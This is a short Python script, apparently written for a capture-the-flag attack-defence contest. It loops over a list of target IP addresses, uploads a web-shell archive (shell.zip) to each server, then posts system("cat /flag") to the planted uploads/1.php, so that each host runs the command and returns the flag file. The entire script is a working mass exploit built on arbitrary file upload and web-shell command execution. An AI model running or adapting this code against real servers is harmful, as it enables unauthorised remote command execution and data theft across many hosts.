import requests


with open('ip.txt', 'r') as file:
    ip_list = file.read().splitlines()


for ip in ip_list:
    url = f"http://{ip}:80/"
    file_path = 'shell.zip'
    with open(file_path, 'rb') as file:
        files = {'file': (file_path, file)}
        try :
            response = requests.post(url, files=files)
        except:
            print(f'{ip}：请求出错')
    if response.status_code == 200:
        print(f'{ip}：文件上传成功！')
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"hack": "system(\"cat /flag\");"}
        response = requests.post(f"{url}uploads/1.php", headers=headers, data=data)
        print(f'{ip}：{response.text}')
    else:
        print(f'{ip}：文件上传失败。')


